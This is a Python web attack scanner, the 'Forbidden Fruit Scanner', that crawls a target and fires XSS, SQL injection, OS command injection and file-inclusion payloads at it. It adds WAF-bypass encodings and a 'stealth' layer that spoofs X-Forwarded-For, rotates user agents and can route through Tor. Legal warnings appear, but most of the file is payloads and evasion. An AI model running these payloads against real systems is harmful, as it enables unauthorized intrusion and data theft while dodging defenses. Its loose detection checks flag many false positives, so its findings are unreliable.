#!/usr/bin/env python3
"""
FORBIDDEN FRUIT SCANNER v8.0 - ULTIMATE WEB VULNERABILITY SCANNER
- Advanced XSS detection surpassing XSStrike
- Context-aware payload injection
- WAF bypass techniques
- DOM-based XSS detection
- Enhanced stealth engine
"""

import sys
import time
import asyncio
import aiohttp
import random
import json
import re
import html
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from bs4 import BeautifulSoup
from datetime import datetime, timezone
import itertools
import threading
import string
from colorama import Fore, Style, init
import base64
import hashlib

# Initialize colorama
init(autoreset=True)

# --- CONFIGURATION ---
MAX_CONCURRENT = 15
REQUEST_DELAY = (0.5, 2.0)  # More aggressive but still stealthy
TIMEOUT = 30
MAX_DEPTH = 3
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]
PROXY = None  # "socks5://localhost:9050" for Tor

def print_intro():
    intro = r"""
   _____  ____   _____ _____  _____ _______       _   _ ______ _____  
  / ____|/ __ \ / ____|  __ \|_   _|__   __|/\   | \ | |  ____|  __ \ 
 | (___ | |  | | |    | |__) | | |    | |  /  \  |  \| | |__  | |__) |
  \___ \| |  | | |    |  _  /  | |    | | / /\ \ | . ` |  __| |  _  / 
  ____) | |__| | |____| | \ \ _| |_   | |/ ____ \| |\  | |____| | \ \ 
 |_____/ \____/ \_____|_|  \_\_____|  |_/_/    \_\_| \_|______|_|  \_\
    """
    
    # Animated color cycling
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    # Print animated intro
    for i in range(len(intro.split('\n'))):  # Line by line
        time.sleep(0.05)
        print(colors[i % len(colors)] + intro.split('\n')[i])
    
    time.sleep(0.5)
    
    # Scrolling text animation
    tagline = "FORBIDDEN FRUIT SCANNER v8.0 - XSStrike Killer"
    for i in range(len(tagline) + 1):
        sys.stdout.write(Fore.CYAN + "\r" + tagline[:i] + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.05)
    
    time.sleep(0.3)
    
    # Warning message animation
    warning = "Ethical Scanning Tool - Use Responsibly"
    print("\n")
    for char in warning:
        sys.stdout.write(Fore.YELLOW + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.03)
    
    # Final flash
    print("\n\n")
    for _ in range(3):
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.write(Fore.RED + "! LEGAL WARNING: Only scan systems you own or have permission to test !" + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.2)
        sys.stdout.write("\r" + " " * 80 + "\r")
        time.sleep(0.1)
    
    print("\n\n" + Fore.RED + "! LEGAL WARNING: Only scan systems you own or have permission to test !" + Style.RESET_ALL + "\n")

# Advanced payload system with context awareness
class PayloadGenerator:
    @staticmethod
    def generate_xss_payloads(context):
        """Generate context-aware XSS payloads"""
        base_payloads = [
            # Basic payloads
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            
            # Obfuscated payloads
            "<svg/onload=alert(1)>",
            "<marquee/onstart=alert(1)>",
            "<details/open/ontoggle=alert(1)>",
            
            # DOM-based payloads
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "`${alert(1)}`",
            
            # WAF bypass payloads
            "<script>/*%00*/alert(1)/*%00*/</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            
            # Special context payloads
            "onmouseover=alert(1)",
            "autofocus/onfocus=alert(1)//",
            "javascript:alert(document.cookie)"
        ]
        
        # Context-specific payloads
        if context == 'html':
            return base_payloads + [
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>"
            ]
        elif context == 'attribute':
            return base_payloads + [
                "\" onmouseover=alert(1) x=\"",
                "' onfocus=alert(1) autofocus '"
            ]
        elif context == 'javascript':
            return base_payloads + [
                "';alert(1);//",
                "\";alert(1);//",
                "alert(1)",
                "eval('alert(1)')"
            ]
        elif context == 'url':
            return base_payloads + [
                "javascript:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
            ]
        
        return base_payloads

    @staticmethod
    def generate_sqli_payloads():
        """Generate advanced SQLi payloads"""
        return [
            {"payload": "' OR 1=1-- -", "desc": "Basic SQLi"},
            {"payload": "' UNION SELECT null,username,password FROM users-- -", "desc": "Union SQLi"},
            {"payload": "1 AND SLEEP(5)", "desc": "Blind SQLi"},
            {"payload": "1' WAITFOR DELAY '0:0:5'--", "desc": "Time-based SQLi"},
            {"payload": "' OR EXISTS(SELECT * FROM information_schema.tables)--", "desc": "Boolean-based SQLi"},
            {"payload": "' OR 1=1 LIMIT 1-- -", "desc": "MySQL-specific SQLi"},
            {"payload": "'||(SELECT 0x4A6F686E)||'", "desc": "Concatenation-based SQLi"}
        ]

    @staticmethod
    def generate_waf_bypass_payloads(base_payload):
        """Generate WAF bypass variations of a payload"""
        variations = []
        
        # Case variation
        variations.append(base_payload.upper())
        variations.append(''.join(
            c.upper() if random.random() > 0.5 else c.lower() 
            for c in base_payload
        ))
        
        # Encoding variations
        variations.append(quote(base_payload))
        variations.append(base64.b64encode(base_payload.encode()).decode())
        variations.append(''.join(f'&#{ord(c)};' for c in base_payload))
        
        # Obfuscation techniques
        variations.append(base_payload.replace('<', '%3C').replace('>', '%3E'))
        variations.append(base_payload.replace('script', 'scr\x00ipt'))
        variations.append(base_payload.replace(' ', '/**/'))
        
        # Null byte injection
        variations.append(base_payload.replace('>', '\x00>'))
        
        return variations

# Vulnerability type mapping
VULN_TYPE_MAP = {
    "1": "xss",
    "2": "sqli",
    "3": "rce",
    "4": "lfi",
    "5": "all"
}

class Spinner:
    def __init__(self, message="Scanning"):
        self.spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        self.stop_running = False
        self.message = message
        self.thread = threading.Thread(target=self._spin)

    def _spin(self):
        while not self.stop_running:
            sys.stdout.write(f"\r{Fore.YELLOW}{next(self.spinner)} {self.message}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write("\r" + " " * (len(self.message) + 10) + "\r")

    def start(self):
        self.thread.start()

    def stop(self):
        self.stop_running = True
        self.thread.join()

class StealthEngine:
    def __init__(self):
        self.last_request = 0
        self.request_count = 0
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
    def generate_headers(self):
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Scanner-ID': self.session_id
        }
        
        # Rotate headers occasionally
        if random.random() > 0.7:
            headers['Accept'] = '*/*'
        if random.random() > 0.8:
            headers['Connection'] = 'close'
            
        return headers
    
    async def random_delay(self):
        # Adaptive delay based on request count
        base_delay = random.uniform(*REQUEST_DELAY)
        
        # Every 10 requests, add a longer delay
        if self.request_count % 10 == 0:
            base_delay += random.uniform(2, 5)
            
        elapsed = time.time() - self.last_request
        if elapsed < base_delay:
            await asyncio.sleep(base_delay - elapsed)
            
        self.last_request = time.time()
        self.request_count += 1

class CyberScanner:
    def __init__(self, target_url, vuln_types):
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"http://{target_url}"
        self.target = target_url
        self.domain = urlparse(target_url).netloc
        self.engine = StealthEngine()
        self.vuln_types = vuln_types if 'all' not in vuln_types else list(VULN_TYPE_MAP.values())
        self.results = {
            "target": target_url,
            "start_time": datetime.now(timezone.utc).isoformat(),
            "vulnerabilities": [],
            "stats": {
                "requests": 0,
                "urls": 0,
                "forms": 0,
                "parameters": 0
            }
        }
        self.payload_generator = PayloadGenerator()
        self.visited_urls = set()
        self.fingerprints = set()

    async def scan(self):
        print_intro()
        
        try:
            # Create session
            connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, force_close=True)
            timeout = aiohttp.ClientTimeout(total=TIMEOUT)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                # Crawl first
                spinner = Spinner("Crawling site")
                spinner.start()
                urls = await self._crawl_site(session)
                spinner.stop()
                print(f"{Fore.GREEN}[+] Found {len(urls)} URLs{Style.RESET_ALL}")
                self.results["stats"]["urls"] = len(urls)
                
                # Test URLs
                spinner = Spinner("Testing vulnerabilities")
                spinner.start()
                tasks = []
                for url in urls:
                    tasks.append(self._test_url(session, url))
                    tasks.append(self._test_forms(session, url))
                
                await asyncio.gather(*tasks)
                spinner.stop()
                
                # DOM XSS analysis
                if 'xss' in self.vuln_types:
                    spinner = Spinner("Analyzing for DOM XSS")
                    spinner.start()
                    await self._analyze_dom_xss(session, urls)
                    spinner.stop()
                
        except Exception as e:
            print(f"{Fore.RED}[!] Critical error: {e}{Style.RESET_ALL}")
        finally:
            self.results["end_time"] = datetime.now(timezone.utc).isoformat()
            return self._generate_report()

    async def _ghost_request(self, session, method, url, **kwargs):
        await self.engine.random_delay()
        headers = self.engine.generate_headers()
        
        try:
            async with session.request(
                method=method,
                url=url,
                headers=headers,
                ssl=False,
                allow_redirects=False,
                proxy=PROXY,
                **kwargs
            ) as response:
                self.results["stats"]["requests"] += 1
                content = await response.text()
                
                # Check for WAF
                if response.status in [403, 406, 419] or "cloudflare" in response.headers.get('server', '').lower():
                    print(f"{Fore.YELLOW}[!] Possible WAF detected at {url}{Style.RESET_ALL}")
                
                return content
        except Exception as e:
            print(f"{Fore.RED}[!] Request failed ({url}): {str(e)[:80]}{Style.RESET_ALL}")
            return None

    async def _crawl_site(self, session, max_depth=MAX_DEPTH):
        visited = set()
        to_visit = [(self.target, 0)]
        urls = set()

        while to_visit:
            url, depth = to_visit.pop(0)
            
            if depth > max_depth or url in visited:
                continue
                
            visited.add(url)
            
            try:
                content = await self._ghost_request(session, 'GET', url)
                if not content:
                    continue
                    
                urls.add(url)
                soup = BeautifulSoup(content, 'html.parser')
                
                # Find all links
                for tag in soup.find_all(['a', 'link', 'img', 'script', 'iframe', 'form'], href=True):
                    new_url = urljoin(url, tag['href'])
                    if self.domain in urlparse(new_url).netloc and new_url not in visited:
                        to_visit.append((new_url, depth + 1))
                
                # Find form actions
                for form in soup.find_all('form', action=True):
                    form_url = urljoin(url, form['action'])
                    if self.domain in urlparse(form_url).netloc and form_url not in visited:
                        to_visit.append((form_url, depth + 1))
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Crawl error: {e}{Style.RESET_ALL}")
                
        return list(urls)

    async def _test_url(self, session, url):
        parsed = urlparse(url)
        if not parsed.query:
            return
            
        params = parse_qs(parsed.query)
        self.results["stats"]["parameters"] += len(params)
        
        for param in params:
            # Test each vulnerability type
            if 'xss' in self.vuln_types:
                await self._test_xss(session, url, param, params)
                
            if 'sqli' in self.vuln_types:
                await self._test_sqli(session, url, param, params)
                
            if 'rce' in self.vuln_types:
                await self._test_rce(session, url, param, params)
                
            if 'lfi' in self.vuln_types:
                await self._test_lfi(session, url, param, params)

    async def _test_xss(self, session, url, param, params):
        # Get context by sending a benign payload first
        context = await self._determine_context(session, url, param, params)
        
        # Generate context-aware payloads
        payloads = self.payload_generator.generate_xss_payloads(context)
        
        for payload in payloads:
            # Generate WAF bypass variations
            for test_payload in self.payload_generator.generate_waf_bypass_payloads(payload):
                test_params = params.copy()
                test_params[param] = [test_payload]
                test_url = urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()
                
                response = await self._ghost_request(session, 'GET', test_url)
                if response and self._is_xss_vulnerable(response, test_payload):
                    self._log_vulnerability("xss", param, test_url, f"XSS with {test_payload[:50]}...")
                    break  # Don't test more payloads for this param if one worked

    async def _determine_context(self, session, url, param, params):
        """Determine the injection context (HTML, attribute, JavaScript, etc.)"""
        test_params = params.copy()
        test_params[param] = ["CONTEXT_TEST_STRING"]
        test_url = urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()
        
        response = await self._ghost_request(session, 'GET', test_url)
        if not response:
            return 'html'  # Default to HTML context
        
        # Check if our test string appears in the response
        if "CONTEXT_TEST_STRING" not in response:
            return 'html'  # Probably filtered
        
        soup = BeautifulSoup(response, 'html.parser')
        
        # Check if it's in a script tag
        script_tags = soup.find_all('script', string=re.compile("CONTEXT_TEST_STRING"))
        if script_tags:
            return 'javascript'
            
        # Check if it's in an attribute
        attr_tags = soup.find_all(lambda tag: any("CONTEXT_TEST_STRING" in str(val) for val in tag.attrs.values()))
        if attr_tags:
            return 'attribute'
            
        # Check if it's in a URL
        url_tags = soup.find_all(href=re.compile("CONTEXT_TEST_STRING"))
        if url_tags:
            return 'url'
            
        # Default to HTML context
        return 'html'

    def _is_xss_vulnerable(self, response, payload):
        """Advanced XSS detection with context awareness"""
        if not response:
            return False
            
        # Check for direct reflection
        if payload in response:
            return True
            
        # Check for decoded reflection
        if html.unescape(payload) in response:
            return True
            
        # Check for partial reflection
        if any(part in response for part in payload.split() if len(part) > 3):
            return True
            
        # Check for DOM-based patterns
        dom_patterns = [
            r'document\.location',
            r'document\.URL',
            r'document\.URLUnencoded',
            r'document\.referrer',
            r'window\.location',
            r'eval\(',
            r'setTimeout\(',
            r'setInterval\(',
            r'Function\('
        ]
        
        if any(re.search(pattern, response) for pattern in dom_patterns):
            return True
            
        return False

    async def _test_sqli(self, session, url, param, params):
        for payload in self.payload_generator.generate_sqli_payloads():
            test_params = params.copy()
            test_params[param] = [payload["payload"]]
            test_url = urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()
            
            start_time = time.time()
            response = await self._ghost_request(session, 'GET', test_url)
            
            if response and self._is_sqli_vulnerable(response, payload, time.time() - start_time):
                self._log_vulnerability("sqli", param, test_url, payload["desc"])
                break

    def _is_sqli_vulnerable(self, response, payload, response_time):
        """Advanced SQLi detection with time-based checks"""
        response_lower = response.lower()
        
        # Check for error messages
        error_indicators = [
            'sql syntax',
            'mysql_fetch',
            'unclosed quotation',
            'syntax error',
            'odbc',
            'jdbc',
            'pdo',
            'postgresql',
            'ora-'
        ]
        
        if any(err in response_lower for err in error_indicators):
            return True
            
        # Check for time-based SQLi
        if 'sleep' in payload["payload"].lower() or 'waitfor' in payload["payload"].lower():
            if response_time > 5:  # If response took more than 5 seconds
                return True
                
        # Check for content differences
        if len(response) < 100 or "error" in response_lower:
            return True
            
        return False

    async def _test_rce(self, session, url, param, params):
        payloads = [
            {"payload": ";ls", "desc": "UNIX command"},
            {"payload": "|id", "desc": "UNIX command"},
            {"payload": "`id`", "desc": "UNIX command"},
            {"payload": "$(id)", "desc": "UNIX command"},
            {"payload": "|dir", "desc": "Windows command"},
            {"payload": ";dir", "desc": "Windows command"}
        ]
        
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = [payload["payload"]]
            test_url = urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()
            
            response = await self._ghost_request(session, 'GET', test_url)
            if response and self._is_rce_vulnerable(response):
                self._log_vulnerability("rce", param, test_url, payload["desc"])
                break

    def _is_rce_vulnerable(self, response):
        response_lower = response.lower()
        return any(
            cmd in response_lower 
            for cmd in ['root:', 'volume serial', 'index of', 'uid=', 'gid=', 'directory of']
        )

    async def _test_lfi(self, session, url, param, params):
        payloads = [
            {"payload": "../../../../etc/passwd", "desc": "UNIX LFI"},
            {"payload": "..\\..\\windows\\win.ini", "desc": "Windows LFI"},
            {"payload": "php://filter/convert.base64-encode/resource=index.php", "desc": "PHP wrapper"},
            {"payload": "/proc/self/environ", "desc": "UNIX procfs"}
        ]
        
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = [payload["payload"]]
            test_url = urlparse(url)._replace(query=urlencode(test_params, doseq=True)).geturl()
            
            response = await self._ghost_request(session, 'GET', test_url)
            if response and self._is_lfi_vulnerable(response):
                self._log_vulnerability("lfi", param, test_url, payload["desc"])
                break

    def _is_lfi_vulnerable(self, response):
        response_lower = response.lower()
        return any(
            leak in response_lower 
            for leak in ['root:', '[boot loader]', 'mysql_history', '<?php', 'extension_dir']
        )

    async def _test_forms(self, session, url):
        content = await self._ghost_request(session, 'GET', url)
        if not content:
            return
            
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')
        self.results["stats"]["forms"] += len(forms)
        
        for form in forms:
            if 'xss' in self.vuln_types:
                await self._test_form_xss(session, url, form)
                
            if 'sqli' in self.vuln_types:
                await self._test_form_sqli(session, url, form)
                
            if 'rce' in self.vuln_types:
                await self._test_form_rce(session, url, form)
                
            if 'lfi' in self.vuln_types:
                await self._test_form_lfi(session, url, form)

    async def _test_form_xss(self, session, url, form):
        form_action = urljoin(url, form.get('action', '')) or url
        method = form.get('method', 'get').lower()
        
        # Get all input fields
        inputs = form.find_all(['input', 'textarea', 'select'])
        form_data = {}
        
        for input_tag in inputs:
            name = input_tag.get('name')
            if name:
                form_data[name] = "XSS_TEST"
                
        if not form_data:
            return
            
        # Submit form with test data to determine context
        if method == 'get':
            response = await self._ghost_request(session, 'GET', form_action, params=form_data)
        else:
            response = await self._ghost_request(session, 'POST', form_action, data=form_data)
            
        if not response:
            return
            
        # Determine context for each field
        contexts = {}
        for field in form_data:
            if field in response:
                contexts[field] = self._determine_field_context(response, field)
            else:
                contexts[field] = 'html'
                
        # Test each field with context-aware payloads
        for field, context in contexts.items():
            payloads = self.payload_generator.generate_xss_payloads(context)
            
            for payload in payloads:
                test_data = {f: "XSS_TEST" for f in form_data}
                test_data[field] = payload
                
                if method == 'get':
                    response = await self._ghost_request(session, 'GET', form_action, params=test_data)
                else:
                    response = await self._ghost_request(session, 'POST', form_action, data=test_data)
                    
                if response and self._is_xss_vulnerable(response, payload):
                    self._log_vulnerability("xss", field, form_action, f"Form XSS with {payload[:50]}...")
                    break

    def _determine_field_context(self, response, field):
        """Determine the context of a form field reflection"""
        if f'name="{field}"' in response:
            return 'attribute'
        if f'"{field}":' in response:
            return 'javascript'
        if field in re.findall(r'<script[^>]*>.*?</script>', response, re.DOTALL):
            return 'javascript'
        return 'html'

    async def _analyze_dom_xss(self, session, urls):
        """Analyze for DOM-based XSS vulnerabilities"""
        for url in urls:
            content = await self._ghost_request(session, 'GET', url)
            if not content:
                continue
                
            # Check for dangerous JavaScript patterns
            dom_sinks = [
                'innerHTML',
                'outerHTML',
                'document.write',
                'document.writeln',
                'eval(',
                'setTimeout(',
                'setInterval(',
                'Function(',
                'location.href',
                'location.assign',
                'location.replace'
            ]
            
            script_tags = re.findall(r'<script[^>]*>.*?</script>', content, re.DOTALL)
            for script in script_tags:
                for sink in dom_sinks:
                    if sink in script:
                        sources = re.findall(r'(location\..*?|document\..*?|window\..*?|[\w]+\.value)', script)
                        for source in sources:
                            if source != sink:
                                self._log_vulnerability(
                                    "xss", 
                                    "DOM", 
                                    url, 
                                    f"Potential DOM XSS: {source} -> {sink}"
                                )

    def _log_vulnerability(self, vuln_type, param, url, desc):
        # Create a fingerprint to avoid duplicates
        fingerprint = hashlib.md5(f"{vuln_type}{param}{url}".encode()).hexdigest()
        
        if fingerprint not in self.fingerprints:
            print(f"{Fore.RED}[!] Found {vuln_type.upper()} in {param} @ {url}{Style.RESET_ALL}")
            self.results["vulnerabilities"].append({
                "type": vuln_type,
                "param": param,
                "url": url,
                "description": desc,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
            self.fingerprints.add(fingerprint)

    def _generate_report(self):
        filename = f"scan_{self.domain}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
            
        vuln_count = len(self.results["vulnerabilities"])
        print(f"\n{Fore.GREEN}[+] Scan complete! {vuln_count} vulnerabilities found")
        print(f"{Fore.CYAN}[*] Report saved to {filename}{Style.RESET_ALL}")
        
        # Generate quick summary
        print(f"\n{Fore.YELLOW}=== Scan Summary ===")
        print(f"Target: {self.target}")
        print(f"Scan duration: {self.results['end_time']}")
        print(f"Total requests: {self.results['stats']['requests']}")
        print(f"URLs discovered: {self.results['stats']['urls']}")
        print(f"Forms tested: {self.results['stats']['forms']}")
        print(f"Parameters tested: {self.results['stats']['parameters']}")
        
        # Vulnerability breakdown
        vuln_types = {}
        for vuln in self.results["vulnerabilities"]:
            vuln_types[vuln["type"]] = vuln_types.get(vuln["type"], 0) + 1
            
        for vuln_type, count in vuln_types.items():
            print(f"{vuln_type.upper()}: {count}")
            
        print("=================={Style.RESET_ALL}")
        
        return filename

async def main():
    print_intro()
    
    target = input(f"{Fore.YELLOW}[?] Enter target URL: {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[!] No target specified{Style.RESET_ALL}")
        return
        
    print(f"\n{Fore.CYAN}Available tests:{Style.RESET_ALL}")
    for num, name in VULN_TYPE_MAP.items():
        print(f" {num}. {name.upper()}")
        
    choices = input(f"\n{Fore.YELLOW}[?] Select tests (comma separated): {Style.RESET_ALL}").strip()
    selected = set()
    
    for choice in choices.split(','):
        choice = choice.strip()
        if choice in VULN_TYPE_MAP:
            if choice == "5":  # All
                selected = set(VULN_TYPE_MAP.values())
                break
            selected.add(VULN_TYPE_MAP[choice])
            
    if not selected:
        print(f"{Fore.RED}[!] No tests selected{Style.RESET_ALL}")
        return
        
    scanner = CyberScanner(target, selected)
    await scanner.scan()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan aborted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
